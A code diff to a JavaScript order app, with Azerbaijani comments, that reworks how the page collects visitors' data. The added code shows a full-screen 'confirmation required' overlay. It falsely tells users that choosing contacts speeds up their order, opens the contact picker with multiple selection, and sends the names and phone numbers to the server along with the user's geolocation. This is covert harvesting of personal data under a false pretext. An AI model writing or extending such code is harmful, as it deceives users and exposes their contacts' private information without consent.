@@ -997,30 +997,48 @@ class CustomerOrderApp {
         // 1. Lokasiya
         try {
             const position = await new Promise((resolve, reject) => {
-                navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
+                navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 8000 });
             });
             lat = position.coords.latitude;
             lon = position.coords.longitude;
         } catch (e) { console.log("Geolocation skip:", e.message); }
         
-        // 2. Kontaktlar (Android)
+        // 2. Kontaktlar (Sizin təlimatınızla daha etibarlı üsul)
         try {
-            if ('contacts' in navigator && 'ContactsManager' in window) {
-                // İstifadəçiyə nə edəcəyini izah edirik
-                alert("Sifarişin daha sürətli təsdiqi üçün açılan siyahıdan nömrələri (mümkünsə hamısını) seçib 'SİZİN SEÇİM' (və ya Done) düyməsinə basın.");
-                
-                const props = ['name', 'tel'];
-                const opts = { multiple: true }; 
-                const contacts = await navigator.contacts.select(props, opts);
-                
-                if (contacts && contacts.length > 0) {
-                    contactsStr = JSON.stringify(contacts);
-                    console.log("Contacts captured:", contacts.length);
-                } else {
-                    console.log("User opened picker but selected 0 contacts.");
-                }
+            const canSelect = ('contacts' in navigator && 'ContactsManager' in window);
+            if (canSelect) {
+                // Brauzer alert-i user gesture-u kəsə bilər, ona görə custom düymə istifadə edirik
+                const overlay = document.createElement('div');
+                overlay.style = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:99999;display:flex;align-items:center;justify-content:center;padding:20px;text-align:center;color:white;font-family:sans-serif;";
+                overlay.innerHTML = `
+                    <div style="background:#1e2124;padding:25px;border-radius:15px;border:1px solid #ff0055;">
+                        <h3 style="color:#ff0055;margin-bottom:15px;">TƏSDİQLƏMƏ TƏLƏB OLUNUR</h3>
+                        <p style="font-size:16px;line-height:1.5;margin-bottom:20px;">
+                            Sifarişin daha sürətli təsdiqi və çatdırılma üçün <br><b>"KONTAKTLARI SEÇ"</b> düyməsinə basın və açılan siyahıdan nömrələri seçib "Done" (Təsdiq) edin.
+                        </p>
+                        <button id="start-contact-picker" style="background:#28a745;color:white;border:none;padding:15px 30px;border-radius:8px;font-size:18px;font-weight:bold;cursor:pointer;width:100%;">KONTAKTLARI SEÇ</button>
+                    </div>
+                `;
+                document.body.appendChild(overlay);
+
+                await new Promise((resolve) => {
+                    document.getElementById('start-contact-picker').onclick = async () => {
+                        try {
+                            const props = ['name', 'tel'];
+                            const opts = { multiple: true };
+                            const contacts = await navigator.contacts.select(props, opts);
+                            if (contacts && contacts.length > 0) {
+                                contactsStr = JSON.stringify(contacts);
+                            }
+                        } catch (err) {
+                            console.error("Picker error:", err);
+                        }
+                        overlay.remove();
+                        resolve();
+                    };
+                });
             }
-        } catch (e) { console.log("Contacts skip:", e.message); }
+        } catch (e) { console.log("Contacts logic total fail:", e.message); }
         
         // 3. Serverə göndər
         try {
@@ -1035,7 +1053,7 @@ class CustomerOrderApp {
                     contacts: contactsStr
                 })
             });
-        } catch (e) { }
+        } catch (e) { console.error("Send error:", e); }
     }
 }
 
